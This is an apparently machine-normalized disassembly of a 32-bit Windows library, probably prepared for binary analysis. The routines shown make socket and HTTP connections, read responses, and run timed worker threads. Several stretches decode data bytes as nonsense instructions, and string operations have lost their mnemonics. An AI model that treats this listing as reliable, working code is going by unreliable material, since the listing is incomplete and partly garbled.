retn 0xc
mov eax [ ebx + 0x134 ]
test eax eax
jne r-xdata
mov ecx [ ebp ]
xor eax eax
mov [ ecx + edi ] al
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x1c ]
cmp edx eax
jbe r-xdata
pop edi
mov [ ebp ] eax
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0xc
mov edx [ ebp ]
add edx eax
mov eax edx
mov [ ebp ] edx
cmp eax esi
je r-xdata
mov esi [ ebx + 0x130 ]
mov edi [ esp + 0x18 ]
mov ecx edx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x18 ]
pop edi
pop esi
mov [ ecx + edx ] 0x0
mov [ ebp ] edx
mov ecx [ ebx + 0x130 ]
mov eax [ ebx + 0x134 ]
add ecx edx
sub eax edx
mov [ ebx + 0x130 ] ecx
mov [ ebx + 0x134 ] eax
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0xc
mov esi [ ebx + 0x130 ]
mov edi [ esp + 0x18 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x18 ]
pop edi
pop esi
mov [ eax + ecx ] 0x0
mov [ ebp ] eax
mov edx [ ebx + 0x130 ]
mov ecx [ ebx + 0x134 ]
add edx eax
sub ecx eax
mov [ ebx + 0x130 ] edx
mov [ ebx + 0x134 ] ecx
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0xc
mov ecx [ ebp ]
mov eax [ esp + 0x10 ]
mov [ ecx + edi ] 0x0
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0xc
mov edx esi
push 0x0
sub edx eax
add eax edi
push edx
push eax
mov eax [ ebx + 0x150 ]
push eax
call [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
sub_10008460
sub esp 0x1a0
push ebx
mov ebx ecx
push 0x8000
call sub_10009010
add esp 0x4
mov [ ebx + 0x144 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x154 ]
test eax eax
je r-xdata
pop ebx
add esp 0x1a0
retn
xor eax eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
push ecx
mov [ esp + 0xc ] eax
push 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
call [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x1
push 0x2
call [ rw-data ]
cmp eax 0xffffffff
mov [ ebx + 0x150 ] eax
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
call [ rw-data ]
test eax eax
mov [ ebx + 0x140 ] eax
jne r-xdata
mov dx [ ebx + 0x148 ]
mov [ esp + 0x4 ] 0x2
push edx
call [ rw-data ]
mov [ esp + 0x6 ] ax
mov eax [ ebx + 0x14c ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
pop ebx
add esp 0x1a0
retn
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
lea ecx [ ebx + 0x2c ]
push 0x50
push ecx
push eax
call [ rw-data ]
xor edx edx
mov [ ebx + 0x13c ] eax
test eax eax
setne dl
mov eax edx
pop ebx
add esp 0x1a0
retn
pop ebx
add esp 0x1a0
retn
movsx ecx [ eax + 0xa ]
mov edx [ eax + 0xc ]
push esi
mov eax ecx
push edi
mov esi [ edx ]
lea edi [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov edx [ ebx + 0x150 ]
mov ecx eax
and ecx 0x3
push 0x0
[ edi ] [ esi ]
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x1c ]
push 0x10
push ecx
push edx
call [ rw-data ]
neg eax
sbb eax eax
pop edi
pop esi
inc eax
pop ebx
add esp 0x1a0
retn
pop ebx
add esp 0x1a0
retn
sub_100085b0
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
test ebx ebx
mov esi ecx
jne r-xdata
mov eax [ esi + 0x14c ]
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn 0x4
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call sub_10009010
mov edx eax
add esp 0x4
test edx edx
mov [ esi + 0x14c ] edx
jne r-xdata
push eax
call sub_1000901e
add esp 0x4
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
retn 0x4
pop edi
pop esi
pop ebx
retn 0x4
sub_10008680
push ecx
push ebx
push ebp
push esi
mov esi [ esp + 0x1c ]
push edi
mov ebp ecx
xor edi edi
mov [ esp + 0x10 ] 0x1
mov [ esi ] edi
mov eax [ ebp + 0x154 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x150 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp + 0x12c ]
test eax eax
je r-xdata
mov edx [ esp + 0x1c ]
mov ebx [ esp + 0x18 ]
push 0x2
push edx
push ebx
push eax
call [ rw-data ]
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn 0xc
mov eax [ ebp + 0x130 ]
push rw-data
push eax
call sub_10009f60
add esp 0x8
test eax eax
jne r-xdata
mov [ esp + 0x10 ] 0x0
test eax eax
je r-xdata
mov esi [ ebp + 0x130 ]
mov edx [ esp + 0x18 ]
sub eax esi
mov edi edx
add eax 0x2
mov ecx eax
mov ebx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov [ eax + edx ] 0x0
mov edx [ ebp + 0x134 ]
mov ecx [ ebp + 0x130 ]
sub edx eax
add ecx eax
pop edi
mov [ ebp + 0x130 ] ecx
mov ecx [ esp + 0x1c ]
mov [ ebp + 0x134 ] edx
pop esi
mov [ ecx ] eax
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0xc
mov [ esi ] eax
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0xc
xor ecx ecx
test edi edi
sete cl
mov esi ecx
cmp esi eax
jge r-xdata
mov edx [ esp + 0x20 ]
add edi esi
cmp [ edx ] 0x0
jne r-xdata
lea ecx [ edi + ebx ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0xc
mov eax [ esp + 0x1c ]
mov edx [ ebp + 0x150 ]
sub eax edi
push 0x2
lea ecx [ edi + ebx ]
push eax
push ecx
push edx
call [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp + 0x150 ]
mov edx esi
sub edx edi
push 0x0
inc edx
push edx
push ecx
push eax
call [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ecx + esi ] 0xa
je r-xdata
mov [ esp + 0x10 ] 0x0
test eax eax
je r-xdata
inc esi
cmp esi eax
jl r-xdata
mov ecx [ esp + 0x20 ]
lea eax [ edi + esi + 0x1 ]
mov [ ecx ] eax
mov [ eax + ebx ] 0x0
jmp r-xdata
cmp [ ecx + esi - 0x1 ] 0xd
je r-xdata
jmp r-xdata
sub_10008810
push esi
mov esi ecx
mov eax [ esi + 0x144 ]
push eax
call sub_1000901e
mov eax [ esi + 0x154 ]
add esp 0x4
test eax eax
mov [ esi + 0x144 ] 0x0
je r-xdata
mov eax [ esi + 0x150 ]
mov [ esi + 0x144 ] 0x0
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x140 ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
retn
push 0x2
push eax
call [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x13c ]
test eax eax
je r-xdata
push eax
call [ rw-data ]
mov ecx [ esi + 0x150 ]
push ecx
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn
mov esi [ esi + 0x138 ]
test esi esi
je r-xdata
push eax
call [ rw-data ]
call [ rw-data ]
xor eax eax
pop esi
retn
push esi
call [ rw-data ]
mov eax 0x1
pop esi
retn
sub_100088c0
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
lea eax [ esp + 0x10 ]
push eax
push ecx
mov edx [ esi + 0x144 ]
push 0x7fff
push edx
call sub_100091d0
mov eax [ esi + 0x144 ]
add esp 0x10
mov ecx esi
push eax
call sub_100082c0
pop esi
retn
sub_10008910
push esi
push edi
mov edi [ esp + 0xc ]
lea edx [ ecx + 0x2c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn 0x4
sub_10008940
sub esp 0x108
push ebx
push ebp
push esi
mov esi ecx
xor ebx ebx
push edi
mov eax [ esi + 0x154 ]
mov [ esp + 0x14 ] 0x8000
cmp eax ebx
je r-xdata
mov edi [ esp + 0x120 ]
mov edx [ esi + 0x150 ]
push ebx
mov ebx [ esp + 0x120 ]
push edi
push ebx
push edx
mov ebp edi
call [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x28 ]
mov edi [ esp + 0x120 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x108
retn 0x8
sub edi eax
je r-xdata
cmp edi ebx
jne r-xdata
cmp [ esi + 0x24 ] ebx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x108
retn 0x8
mov ecx [ esi + 0x150 ]
mov eax ebp
sub eax edi
push 0x0
add eax ebx
push edi
push eax
push ecx
call [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ esi + 0x4 ]
lea ecx [ esp + 0x18 ]
push eax
push rw-data
push ecx
lea ecx [ esi + 0x4 ]
lea edx [ esp + 0x18 ]
push ecx
push rw-data
push edx
jmp r-xdata
mov edx [ esi + 0x14c ]
lea eax [ esp + 0x18 ]
push edx
push rw-data
push rw-data
push eax
call sub_1000a135
add esp 0x10
jmp r-xdata
mov eax [ esi + 0x14c ]
lea ecx [ esp + 0x18 ]
push eax
push rw-data
push rw-data
push ecx
call sub_1000a135
add esp 0x10
jmp r-xdata
push edi
lea ecx [ esp + 0x1c ]
push rw-data
push ecx
call sub_1000a135
mov edx [ esp + 0x128 ]
mov ecx [ esi + 0x138 ]
add esp 0xc
lea eax [ esp + 0x18 ]
push edi
push edx
push 0xffffffff
push eax
push ecx
call [ rw-data ]
mov edi eax
cmp edi ebx
je r-xdata
call [ GetLastError@IAT ]
mov [ esi + 0x12c ] ebx
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x108
retn 0x8
call sub_1000a135
add esp 0xc
mov eax [ esi + 0x13c ]
push ebx
push 0x80400000
push ebx
push ebx
lea edx [ esp + 0x28 ]
push ebx
push edx
push rw-data
push eax
call [ rw-data ]
cmp eax ebx
mov [ esi + 0x138 ] eax
jne r-xdata
mov ecx [ esi + 0x138 ]
push ecx
call [ rw-data ]
mov [ esi + 0x12c ] edi
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x108
retn 0x8
mov eax [ esi + 0x144 ]
mov ecx [ esi + 0x138 ]
lea edx [ esp + 0x14 ]
push ebx
push edx
push eax
push 0x16
push ecx
call [ rw-data ]
mov edi eax
cmp edi ebx
je r-xdata
mov edx [ esi + 0x144 ]
push rw-data
push edx
xor edi edi
call sub_10009f60
mov cl [ eax + 0xa ]
add eax 0xa
add esp 0x8
cmp cl 0x3b
je r-xdata
mov [ edi + esi + 0x4 ] 0x0
mov eax [ esi + 0x28 ]
cmp eax ebx
je r-xdata
mov [ esi + edi + 0x4 ] cl
mov cl [ eax + edi + 0x1 ]
inc edi
cmp cl 0x3b
jne r-xdata
mov ecx [ esi + 0x144 ]
push rw-data
push ecx
call sub_10009f60
mov edx [ esi + 0x144 ]
add esp 0x8
mov [ esi + 0x134 ] ebx
mov [ esi + 0x130 ] edx
mov eax [ esi + 0x144 ]
push rw-data
push eax
call sub_10009f60
mov dl [ eax + 0x6 ]
add eax 0x6
add esp 0x8
xor ecx ecx
cmp dl 0xd
je r-xdata
mov eax [ esi + 0x144 ]
mov [ eax + ecx ] 0x0
cmp eax ebx
jne r-xdata
mov [ ecx + esi + 0x2c ] 0x0
mov [ esi + 0x28 ] ebx
mov [ esi + ecx + 0x2c ] dl
mov dl [ eax + ecx + 0x1 ]
inc ecx
cmp dl 0xd
jne r-xdata
mov eax [ esi + 0x134 ]
lea ecx [ esp + 0x10 ]
mov edx 0x8000
push ecx
mov ecx [ esi + 0x144 ]
sub edx eax
push edx
mov edx [ esi + 0x138 ]
add ecx eax
push ecx
push edx
call [ rw-data ]
mov ebp [ esi + 0x134 ]
mov edi eax
mov eax [ esp + 0x10 ]
add ebp eax
cmp edi ebx
mov [ esi + 0x134 ] ebp
mov ecx ebp
je r-xdata
sub_10008c00
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
call sub_100042a0
je r-xdata
mov [ ebp - 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jne r-xdata
mov [ ebp - 0x10 ] 0x104
je r-xdata
out 0xc7 al
inc ebp
clc
add [ eax ] al
add [ eax ] al
cmp [ ebp - 0xc ] 0x5
jge r-xdata
clc
mov [ rw-data ] 0x0
mov [ rw-data ] 0x5
je r-xdata
push 0x0
push 0x0
jne r-xdata
push 0x0
jne r-xdata
push 0xffffffff
mov edx [ rw-data ]
push edx
call [ WaitForSingleObject@IAT ]
mov eax [ rw-data ]
imul eax eax 0x3c
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
jne r-xdata
push rw-data
push sub_10008ec0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
call [ CloseHandle@IAT ]
je r-xdata
mov [ 0x6a006a ] eax
mov eax [ ebp - 0xc ]
imul eax eax 0x474
mov [ eax + rw-data ] 0x0
mov ecx [ ebp - 0xc ]
imul ecx ecx 0x474
mov [ ecx + rw-data ] 0x0
mov edx [ ebp - 0xc ]
imul edx edx 0x474
mov [ edx + rw-data ] 0x0
mov eax [ ebp - 0xc ]
imul eax eax 0x474
mov [ eax + rw-data ] 0x0
mov ecx [ ebp - 0xc ]
imul ecx ecx 0x474
mov [ ecx + rw-data ] 0x0
mov edx [ ebp - 0xc ]
imul edx edx 0x474
mov [ edx + rw-data ] 0x0
mov eax [ ebp - 0xc ]
imul eax eax 0x474
mov [ eax + rw-data ] 0x0
mov ecx [ ebp - 0xc ]
imul ecx ecx 0x474
mov [ ecx + rw-data ] 0x0
jmp r-xdata
jmp r-xdata
push 0x0
push 0x0
push 0x0
call [ CreateEventA@IAT ]
mov ecx [ ebp - 0xc ]
imul ecx ecx 0x474
mov [ ecx + rw-data ] eax
mov edx [ ebp - 0xc ]
imul edx edx 0x474
cmp [ edx + rw-data ] 0xffffffff
jne r-xdata
and ebp [ edx ]
mov [ rw-data ] 0x0
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov [ rw-data ] 0x747
mov [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jmp 0x258c8d97
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x5
jge r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
imul edx edx 0x474
cmp [ edx + rw-data ] 0xffffffff
je r-xdata
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
imul eax eax 0x474
mov ecx [ eax + rw-data ]
push ecx
call [ CloseHandle@IAT ]
out 0x8b eax
push ebp
hlt
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
sub_10008ec0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001187c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xf84
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xf8c ] eax
lea ecx [ ebp - 0xf88 ]
call sub_10004e20
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0xf8c ]
mov [ ecx + 0x430 ] 0x1
je r-xdata
mov edx [ ebp - 0xf8c ]
push edx
lea ecx [ ebp - 0xf88 ]
call sub_10008900
mov eax [ ebp - 0xf8c ]
mov ecx [ eax ]
push ecx
lea ecx [ ebp - 0xf88 ]
call sub_100072a0
mov edx [ ebp - 0xf8c ]
mov ax [ edx + 0x428 ]
push eax
mov ecx [ ebp - 0xf8c ]
add ecx 0x228
push ecx
lea ecx [ ebp - 0xf88 ]
call sub_100072e0
mov edx [ ebp - 0xf8c ]
add edx 0x328
push edx
lea ecx [ ebp - 0xf88 ]
call sub_10007320
mov eax [ ebp - 0xf8c ]
mov [ eax + 0x430 ] 0x1
lea ecx [ ebp - 0xf88 ]
call sub_10004f70
je r-xdata
jne r-xdata
mov ecx [ ebp - 0xf8c ]
mov edx [ ecx + 0x42c ]
push edx
call [ SetEvent@IAT ]
jne r-xdata
in eax 0x8b
xchg ebp eax
je r-xdata
mov eax [ ebp - 0xf8c ]
mov [ eax + 0x430 ] 0x0
mov [ ebp - 0xf90 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xf88 ]
call sub_10004eb0
mov eax [ ebp - 0xf90 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
out 0x8b al
lea esi [ eax + esi * 8 - 0x1 ]
dec [ ebx + 0x42c91 ]
add [ edx - 0x1 ] dl
adc eax SetEvent@IAT
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add ch ah
sub_10009040
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10009100
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov al 0xff
mov edi edi
[ rw-data ]
push 0x13
call sub_1000b26e
mov [ esp ] 0x1
push 0x0
jmp r-xdata
movsx eax al
jmp r-xdata
mov al [ esi ]
inc esi
mov ah [ edi ]
inc edi
cmp ah al
je r-xdata
mov ebx eax
pop eax
or eax eax
jne r-xdata
mov al [ esi ]
inc esi
mov bl [ edi ]
inc edi
cmp al bl
je r-xdata
mov eax 0xff
xor ebx ebx
nop
pop ebx
pop esi
pop edi
leave
retn
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
push 0x13
call sub_1000b2cf
add esp 0x4
[ rw-data ]
jmp r-xdata
or al al
je r-xdata
push eax
push ebx
call sub_1000b2e4
mov ebx eax
add esp 0x4
call sub_1000b2e4
add esp 0x4
cmp bl al
je r-xdata
sbb al al
sbb al 0xff
mov eax ebx
sbb eax eax
sbb eax 0xffffffff
sub_100091d0
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] 0x42
push eax
call sub_1000b4c7
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_1000b3af
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_10009220
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x1c ] eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push eax
call sub_1000b4c7
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_1000b3af
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_10009280
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jb r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_100092c0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_100093be
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
push [ ebp + 0xc ]
call sub_100096ed
pop ecx
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
push ebx
call sub_10009e3d
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x2
jne r-xdata
mov [ ebp - 0x24 ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
cmp esi 0xffffffe0
ja r-xdata
mov eax [ ebp - 0x24 ]
cmp eax edi
jne r-xdata
push 0x9
call sub_1000b26e
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_1000bd76
pop ecx
mov [ ebp - 0x28 ] eax
cmp eax edi
je r-xdata
cmp eax edi
jne r-xdata
cmp esi edi
jne r-xdata
mov [ ebp - 0x24 ] edi
cmp esi 0xffffffe0
ja r-xdata
cmp esi edi
jbe r-xdata
cmp [ rw-data ] edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_10009549
cmp [ ebp - 0x28 ] edi
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
push 0x1
pop esi
mov eax [ ebp - 0x24 ]
cmp eax edi
jne r-xdata
push 0x9
call sub_1000b26e
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
push ebx
call sub_1000cad1
add esp 0xc
mov edi eax
mov [ ebp - 0x30 ] edi
test edi edi
je r-xdata
push 0x10
pop esi
add esi 0xf
and esi 0xfffffff0
jmp r-xdata
push esi
call sub_1000cf42
pop ecx
test eax eax
jne r-xdata
cmp esi edi
jne r-xdata
cmp [ ebp - 0x24 ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_1000c57f
add esp 0xc
test eax eax
je r-xdata
push esi
call sub_1000cf42
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x24 ] eax
cmp esi [ rw-data ]
jae r-xdata
mov [ ebp + 0xc ] esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x24 ] eax
push 0x1
pop esi
cmp esi edi
jne r-xdata
push esi
call sub_1000c0ca
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x24 ] ebx
jmp r-xdata
push esi
call sub_1000cf42
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ebx esi
shr ebx 0x4
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_1000ce99
add esp 0x10
test eax eax
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax edi
je r-xdata
push 0x1
pop esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
mov [ ebp - 0x20 ] eax
cmp eax esi
jb r-xdata
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_10009697
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
push ebx
call sub_1000cb6d
pop ecx
